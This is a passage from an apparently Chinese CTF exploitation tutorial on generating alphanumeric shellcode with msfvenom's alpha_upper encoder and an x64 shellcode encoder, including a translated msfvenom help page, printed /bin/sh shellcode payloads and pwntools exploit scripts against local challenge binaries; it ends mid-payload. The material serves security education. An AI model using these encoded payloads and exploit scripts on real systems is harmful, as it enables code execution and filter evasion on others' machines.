<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -h</span><br><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">#MsfVenom - 一个Metasploit独立的payload生成器</span><br><span class="line">Also a replacement <span class="keyword">for</span> msfpayload <span class="keyword">and</span> msfencode.</span><br><span class="line">#也是msfpayload和msfencode的替代品。</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line">#使用方法：/usr/bin/msfvenom [选项] &lt;变量=值&gt;</span><br><span class="line">Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</span><br><span class="line">#例如：/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</span><br><span class="line">Options:</span><br><span class="line">    -l, --<span class="built_in">list</span>            &lt;type&gt;     List all modules <span class="keyword">for</span> [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line">   #-l, --<span class="built_in">list</span>            &lt;type&gt;     列出[type]中所有的模块。模块类型包括： payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line">	-p, --payload         &lt;payload&gt;  Payload to use (--<span class="built_in">list</span> payloads to <span class="built_in">list</span>, --<span class="built_in">list</span>-options <span class="keyword">for</span> arguments). Specify <span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> STDIN <span class="keyword">for</span> custom</span><br><span class="line">        --<span class="built_in">list</span>-options               List --payload &lt;value&gt;<span class="string">&#x27;s standard, advanced and evasion options</span></span><br><span class="line"><span class="string">   #-p, --payload         &lt;payload&gt;  指定需要使用的payload（使用--list来列出payload，使用--list-options来查看参数）</span></span><br><span class="line"><span class="string">   #     							 如果要使用自定义的payload，请使用&#x27;</span>-<span class="string">&#x27;或STDIN</span></span><br><span class="line"><span class="string">   #    --list-options               列出 --payload&lt;value&gt;的标准、高级和规避选项</span></span><br><span class="line"><span class="string">    -f, --format          &lt;format&gt;   Output format (use --list formats to list)</span></span><br><span class="line"><span class="string">   #-f, --format          &lt;format&gt;   格式化输出（使用 --list formats 来列出格式化的选项）</span></span><br><span class="line"><span class="string">    -e, --encoder         &lt;encoder&gt;  The encoder to use (use --list encoders to list)</span></span><br><span class="line"><span class="string">   #-e, --encoder         &lt;encoder&gt;  指定需要使用的encoder（编码器）（使用--list encoders来列出选项）</span></span><br><span class="line"><span class="string">        --service-name    &lt;value&gt;    The service name to use when generating a service binary</span></span><br><span class="line"><span class="string">   #    --service-name    &lt;value&gt;    为生成的二进制文件指定服务名称</span></span><br><span class="line"><span class="string">		--sec-name        &lt;value&gt;    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string</span></span><br><span class="line"><span class="string">   #	--sec-name        &lt;value&gt;    为生成大型的Windows二进制文件时指定新节区名。默认：4个随机的alpha字符串</span></span><br><span class="line"><span class="string">        --smallest                   Generate the smallest possible payload using all available encoders</span></span><br><span class="line"><span class="string">   #    --smallest                   使用所有可用的encoder（编码器）生成尽可能最小的payload</span></span><br><span class="line"><span class="string">		--encrypt         &lt;value&gt;    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)</span></span><br><span class="line"><span class="string">   #	--encrypt         &lt;value&gt;    应用到shellcode的加密或编码类型（使用--list encrypt查看）</span></span><br><span class="line"><span class="string">        --encrypt-key     &lt;value&gt;    A key to be used for --encrypt</span></span><br><span class="line"><span class="string">   #    --encrypt-key     &lt;value&gt;    用于加密（--encrypt）的密钥</span></span><br><span class="line"><span class="string">        --encrypt-iv      &lt;value&gt;    An initialization vector for --encrypt</span></span><br><span class="line"><span class="string">   #    --encrypt-iv      &lt;value&gt;    用于加密（--encrypt）的初始化向量</span></span><br><span class="line"><span class="string">    -a, --arch            &lt;arch&gt;     The architecture to use for --payload and --encoders (use --list archs to list)</span></span><br><span class="line"><span class="string">   #-a, --arch            &lt;arch&gt;     为payload（--payload）和编码器（--encoders）指定架构（使用--list archs查看支持的架构）</span></span><br><span class="line"><span class="string">        --platform        &lt;platform&gt; The platform for --payload (use --list platforms to list)</span></span><br><span class="line"><span class="string">   #    --platform        &lt;platform&gt; 指定payload的目标平台（使用--list platforms查看）</span></span><br><span class="line"><span class="string">    -o, --out             &lt;path&gt;     Save the payload to a file</span></span><br><span class="line"><span class="string">   #-o, --out             &lt;path&gt;     将payload输出到文件</span></span><br><span class="line"><span class="string"> 	-b, --bad-chars       &lt;list&gt;     Characters to avoid example: &#x27;</span>\x00\xff<span class="number">&#x27;</span></span><br><span class="line">   #-b, --bad-chars       &lt;<span class="built_in">list</span>&gt;     设定要在payload中规避的字符（集），例如：<span class="string">&#x27;\x00\xff&#x27;</span></span><br><span class="line">    -n, --nopsled         &lt;length&gt;   Prepend a nopsled of [length] size on to the payload</span><br><span class="line">   #-n, --nopsled         &lt;length&gt;   为payload预先指定一个NOP滑动长度</span><br><span class="line">		--pad-nops                   Use nopsled size specified by -n &lt;length&gt; as the total payload size, <span class="keyword">auto</span>-prepending a nopsled of quantity (nops minus payload length)</span><br><span class="line">   #	--pad-nops                   使用由-n &lt;长度&gt;指定的nopsled大小作为总负载大小，自动提前计算nopsled的数量(nops减去payload长度)</span><br><span class="line">    -s, --space           &lt;length&gt;   The maximum size of the resulting payload</span><br><span class="line">   #-s, --space           &lt;length&gt;   设定payload的最大长度</span><br><span class="line">        --encoder-space   &lt;length&gt;   The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">   #    --encoder-space   &lt;length&gt;   编码payload的最大大小(默认为-s的值)</span><br><span class="line">    -i, --iterations      &lt;count&gt;    The number of times to encode the payload</span><br><span class="line">   #-i, --iterations      &lt;count&gt;    指定payload的编码次数</span><br><span class="line">	-c, --add-code        &lt;path&gt;     Specify an additional win32 shellcode file to include</span><br><span class="line">   #-c, --add-code        &lt;path&gt;     指定一个附加的win32 shellcode文件</span><br><span class="line">	-x, --<span class="keyword">template</span>        &lt;path&gt;     Specify a custom executable file to use as a <span class="keyword">template</span></span><br><span class="line">   #-x, --<span class="keyword">template</span>        &lt;path&gt;     指定一个自定义的可执行文件作为模板</span><br><span class="line">	-k, --keep                       Preserve the --<span class="keyword">template</span> behaviour <span class="keyword">and</span> inject the payload as a <span class="keyword">new</span> thread</span><br><span class="line">   #-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    -v, --var-name        &lt;value&gt;    Specify a custom variable name to use <span class="keyword">for</span> certain output formats</span><br><span class="line">   #-v, --var-name        &lt;value&gt;    指定一个自定义的变量，以确定输出格式</span><br><span class="line">	-t, --timeout         &lt;second&gt;   The number of seconds to wait when reading the payload from STDIN (<span class="keyword">default</span> <span class="number">30</span>, <span class="number">0</span> to disable)</span><br><span class="line">   #-t, --timeout         &lt;second&gt;   从STDIN读取payload时需要等待的秒数(默认<span class="number">30</span>,<span class="number">0</span>为禁用)</span><br><span class="line">    -h, --help                       Show <span class="keyword">this</span> message</span><br><span class="line">   #-h, --help                       查看帮助选项</span><br></pre></td></tr></table></figure>

<p>32 位程序可以使用 msf 内置的 encoder 就行了（kali 自带 msf），下面是 encoder（编码器）所支持的编码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/brace                     low        Bash Brace Expansion Command Encoder</span><br><span class="line">    cmd/echo                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Bourne $&#123;IFS&#125; Substitution Command Encoder</span><br><span class="line">    cmd/perl                      normal     Perl Command Encoder</span><br><span class="line">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br><span class="line">    cmd/printf_php_mq             manual     <span class="built_in">printf</span>(<span class="number">1</span>) via PHP magic_quotes Utility Command Encoder</span><br><span class="line">    generic/eicar                 manual     The EICAR Encoder</span><br><span class="line">    generic/none                  normal     The <span class="string">&quot;none&quot;</span> Encoder</span><br><span class="line">    mipsbe/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsbe/longxor                normal     XOR Encoder</span><br><span class="line">    mipsle/byte_xori              normal     Byte XORi Encoder</span><br><span class="line">    mipsle/longxor                normal     XOR Encoder</span><br><span class="line">    php/base64                    great      PHP Base64 Encoder</span><br><span class="line">    ppc/longxor                   normal     PPC LongXOR Encoder</span><br><span class="line">    ppc/longxor_tag               normal     PPC LongXOR Encoder</span><br><span class="line">    ruby/base64                   great      Ruby Base64 Encoder</span><br><span class="line">    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder</span><br><span class="line">    x64/<span class="keyword">xor</span>                       normal     XOR Encoder</span><br><span class="line">    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder</span><br><span class="line">    x64/xor_dynamic               normal     Dynamic key XOR Encoder</span><br><span class="line">    x64/zutto_dekiru              manual     Zutto Dekiru</span><br><span class="line">    x86/add_sub                   manual     Add/Sub Encoder</span><br><span class="line">    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">    x86/avoid_underscore_tolower  manual     Avoid underscore/<span class="built_in">tolower</span></span><br><span class="line">    x86/avoid_utf8_tolower        manual     Avoid UTF8/<span class="built_in">tolower</span></span><br><span class="line">    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder</span><br><span class="line">    x86/bmp_polyglot              manual     BMP Polyglot</span><br><span class="line">    x86/call4_dword_xor           normal     Call+<span class="number">4</span> Dword XOR Encoder</span><br><span class="line">    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_stat              manual     stat(<span class="number">2</span>)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/context_time              manual     time(<span class="number">2</span>)-based Context Keyed Payload Encoder</span><br><span class="line">    x86/countdown                 normal     Single-byte XOR Countdown Encoder</span><br><span class="line">    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder</span><br><span class="line">    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder</span><br><span class="line">    x86/nonalpha                  low        Non-Alpha Encoder</span><br><span class="line">    x86/nonupper                  low        Non-Upper Encoder</span><br><span class="line">    x86/opt_sub                   manual     Sub Encoder (optimised)</span><br><span class="line">    x86/service                   manual     Register Service</span><br><span class="line">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br><span class="line">    x86/single_static_bit         manual     Single Static Bit</span><br><span class="line">    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br><span class="line">    x86/xor_dynamic               normal     Dynamic key XOR Encoder</span><br></pre></td></tr></table></figure>

<p>但是到目前为止（2021-01-14）msf 中还没有 x64 的 alpha_upper 编码方式。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>使用 msf 时，可以用内置的 shellcode，其命令如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=<span class="string">&quot;/bin/sh&quot;</span> -e x86/alpha_upper BufferRegister=eax</span><br></pre></td></tr></table></figure>

<p>来解释一下各个参数的意思：（可以参照我上面翻译的表）</p>
<ul>
<li>-a x86：指定 shellcode 架构为 x86</li>
<li>–platform linux：指定平台为 Linux 平台</li>
<li>-p linux/x86/exec：指定 payload 为 linux/x86/exec</li>
<li>CMD=”/bin/sh”：指定 shell 命令为/bin/sh</li>
<li>-e x86/alpha_upper：指定使用的编码器为 x86/alpha_upper</li>
<li>BufferRegister 指的是指向 shellcode 的寄存器的值</li>
</ul>
<p>正好在“进一步限制 shellcode 的字符”这一小节中提到了一道题，而其的 payload 正好是上述的 shellcode（<strong>每个字符都在 A ～ Z 和 0 ～ 9 范围之内</strong>），将文件扔入 IDA 查看一下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610599710999-548ded0c-c8bf-4ff3-91ad-7ca42608336f.png#align=left&display=inline&height=220&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2012.48.26.png&originHeight=220&originWidth=1240&size=74707&status=done&style=none&width=1240" alt="截屏2021-01-14 12.48.26.png"><br>从上面的图中可以看出，程序在执行我们输入的 shellcode 时会将其放在 eax 中，然后 call eax 去执行，这也就是为什么要指定“BufferRegister”，如果不声明 BufferRegister 的话，生成的 shellcode 会有额外的几条指令来确定 shellcode 的位置，而那几条额外的指令却并不是可打印字符。<br>尝试解这道题，生成 payload：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610599967997-69a40de0-8142-4123-8fcb-360365a225ef.png#align=left&display=inline&height=278&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2012.52.41.png&originHeight=278&originWidth=2376&size=120544&status=done&style=none&width=2376" alt="截屏2021-01-14 12.52.41.png"></p>
<blockquote>
<p>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8J9QBSVU86M53K9JG58FOCCBH30U8VOSRU9RNMYKSV2JH38S0UPS0VOE23YBNFOSCE830V71CLIM1HMK0AA</p>
</blockquote>
<p>写成 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall2&#x27;</span>)</span><br><span class="line">payload=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJDKF8J9QBSVU86M53K9JG58FOCCBH30U8VOSRU9RNMYKSV2JH38S0UPS0VOE23YBNFOSCE830V71CLIM1HMK0AA&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意不可以使用 sendline 发送，sendline 在 payload 结尾会添加’\n’，程序会检查每一个字符是否在 A ～ Z 和 0 ～ 9 范围之内。由于 shellcode 在生成时已经指定架构，因此无需添加 context.arch = ‘amd64’。<br><strong>alpha_upper 应该指的是每个字符都在 A ～ Z 和 0 ～ 9 范围之内。</strong></p>
</blockquote>
<p><strong>当然，我们也可以使用 msf 编码自己的 shellcode：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请将自己的 shellcode 保存名为 shellcode 文件。</p>
</blockquote>
<h2 id="x64-ELFshellcode-encoder"><a href="#x64-ELFshellcode-encoder" class="headerlink" title="x64 ELFshellcode_encoder"></a>x64 ELFshellcode_encoder</h2><p>由于 msf 中没有关于 x64 的 alpha_upper 编码器，但是我们可以是使用 github 上开源的：<a target="_blank" rel="noopener" href="https://github.com/ecx86/shellcode_encoder">shellcode_encoder</a></p>
<blockquote>
<p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/rcx/shellcode_encoder">https://github.com/rcx/shellcode_encoder</a><br>或执行命令：git clone <a target="_blank" rel="noopener" href="https://github.com/rcx/shellcode_encoder">https://github.com/rcx/shellcode_encoder</a><br>安装工具的前置要求：</p>
<ul>
<li>pwntools (<code>pip install pwntools</code>)</li>
<li>z3 python bindings (<code>pip install z3-solver</code>)</li>
</ul>
</blockquote>
<p>和<code>msf</code>上的工具一样，都是要确定 shellcode 的地址才行；使用方法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python2 main.py &lt;shellcode file&gt; &lt;pointer to shellcode&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#exmple：</span></span><br><span class="line">python2 main.py shellcode.<span class="built_in">bin</span> rcx</span><br><span class="line">python2 main.py shellcode.<span class="built_in">bin</span> [rsp+-<span class="number">8</span>]</span><br><span class="line">python2 main.py shellcode.<span class="built_in">bin</span> <span class="number">0x0123456789abcdef</span></span><br><span class="line">python2 main.py shellcode.<span class="built_in">bin</span> rbp+<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>回头看一下之前的 64 位题目（chall3，<strong>可见字符</strong>），放入 IDA 中看一下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610608233903-92590b80-7e97-4d60-a1f9-2dd22193d729.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2015.10.27.png&originHeight=152&originWidth=1372&size=47470&status=done&style=none&width=1372" alt="截屏2021-01-14 15.10.27.png"><br>最后仍旧使用 call rax 来执行 shellcode<br>因此将下载得到的 shellcode 文件放入到 shellcode_encoder 文件夹中，执行命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 main.py shellcode rax</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请手动创建 shellcode 文件：（可以到 shellcode 库下载，这里有很多的 shellcode）<br><a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a><br>也可以到附件中下载 shellcode 文件，下面使用的是附件中的 shellcode</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610613683105-361ec121-3626-4995-9ae0-f7b48bd90f31.png#align=left&display=inline&height=1038&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.41.17.png&originHeight=1038&originWidth=2754&size=286052&status=done&style=none&width=2754" alt="截屏2021-01-14 16.41.17.png"></p>
<blockquote>
<p>PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-<code>@</code>|P<em>Hc4:14:SX-9OOd-Q</em>  5&gt;^??P^14:WX-_^/?-=apD-<code>@</code>|P_Hc4:14:SX-W<code>h)-H   5Sw??P^14:WX-_^/?-=apD-</code>@<code>|P*Hc4:14:SX-QZ##-|@ @57*?[P^14:WX-_^/?-=apD-</code>@<code>|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-</code>@<code>|P_Hc4:14:SX-  uI-!@</code> 5:__<del>P^14:WX-_^/?-=apD-<code>@</code>|P*SX-“A<code>B-#</code>@</del>5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-<em>^/?-=apD-<code>@</code>|P</em>SX-@Ebi- `Y5&lt;*==P^SX-<em>A1”-q@</em><del>5(</del>o_P_AAAA!39(.d@;<em>ez0&amp;!4n_7lrt4n@1</em>}<del>w&lt;?}X9.543}ng$h.j7g4w_iZ?%oQGq|{“7W%78w?s!|N8</del>?DB#<em>MA&lt;z$3[P.f0R</em>z7!|</p>
</blockquote>
<p>编写 exp 如下：（shellcode 最好用三引号括起来）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall3&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5&gt;^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-&quot;A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \`Y5&lt;_==P^SX-_A1&quot;-q@_~5(~o_P_AAAA!39(.d@;*ez0&amp;!4n_7lrt4n@1*&#125;~w&lt;?&#125;X9.543&#125;ng$h.j7g4w_iZ?%oQGq|&#123;&quot;7W%78w?s!|N8~?DB#*MA&lt;z$3[P.f0R*z7!|&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614002426-3708099c-9eff-42d2-aa4e-1f40471d6707.png#align=left&display=inline&height=1104&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.46.36.png&originHeight=1104&originWidth=2748&size=329823&status=done&style=none&width=2748" alt="截屏2021-01-14 16.46.36.png"><br>？？？我 shell 呢？附加 gdb 调试进入 call rax 中看一下，下个断点：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614086058-eabe1bb2-5485-45bd-838a-fc881355b8e7.png#align=left&display=inline&height=70&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.48.02.png&originHeight=120&originWidth=550&size=18732&status=done&style=none&width=321" alt="截屏2021-01-14 16.48.02.png">（因为开启了 PIE 才使用 rebase 下断点）<br>终端输入 c，然后单步进入（si）call：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614373078-e3f121cd-7b64-4357-a788-6a24d23aff35.png#align=left&display=inline&height=1592&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.52.49.png&originHeight=1592&originWidth=1690&size=335227&status=done&style=none&width=1690" alt="截屏2021-01-14 16.52.49.png"><br>emmm。。。没发现有什么不对，看一下 github 上的 wp：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/tree/master/players/%E5%92%95%E5%92%95%E5%92%95">https://github.com/ustclug/hackergame2019-writeups/tree/master/players/%E5%92%95%E5%92%95%E5%92%95</a></p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614565368-3693780f-8217-4e28-9869-13d114d9117f.png#align=left&display=inline&height=190&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.56.00.png&originHeight=190&originWidth=1402&size=52434&status=done&style=none&width=1402" alt="截屏2021-01-14 16.56.00.png"><br>修改一下工具中的 encoder.py：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614648074-95d70000-9127-405d-ace3-9f9bde15e1b2.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.57.19.png&originHeight=114&originWidth=1354&size=29852&status=done&style=none&width=1354" alt="截屏2021-01-14 16.57.19.png"><br>加个 2，保存再次重复上述步骤：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1610614734318-23bf36d7-cb82-447f-9ef3-5f57460575b7.png#align=left&display=inline&height=1026&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-14%2016.58.50.png&originHeight=1026&originWidth=2754&size=284191&status=done&style=none&width=2754" alt="截屏2021-01-14 16.58.50.png"></p>
<blockquote>
<p>PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-<code>@</code>|P<em>Hc4:14:SX-9OOd-Q</em>  5&gt;^??P^14:WX-_^/?-=apD-<code>@</code>|P_Hc4:14:SX-W<code>h)-H   5Sw??P^14:WX-_^/?-=apD-</code>@<code>|P*Hc4:14:SX-QZ##-|@ @57*?[P^14:WX-_^/?-=apD-</code>@<code>|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-</code>@<code>|P_Hc4:14:SX-  uI-!@</code> 5:__<del>P^14:WX-_^/?-=apD-<code>@</code>|P<em>SX-@q<code>L- 0</code>x5:</em>?;P*Hc4:14:SX-IA00- %  5h{??P^14:WX-*^/?-=apD-<code>@</code>|P_SX-?iCI- p?w5?’}?P^SX-_b<code>P-b^</code>p5’???P_AAAA!39(.d@;<em>ez0&amp;!4n_7lrt4n@1</em>}</del>w&lt;?}X9.543}ng$h.j7g4w_iZ?%oQGq|{“7W%78w?s!|N8~?DB#<em>MA&lt;z$3[P.f0R</em>z7!|</p>
</blockquote>
<p>改一下 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall3&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5&gt;^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-&quot;A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- 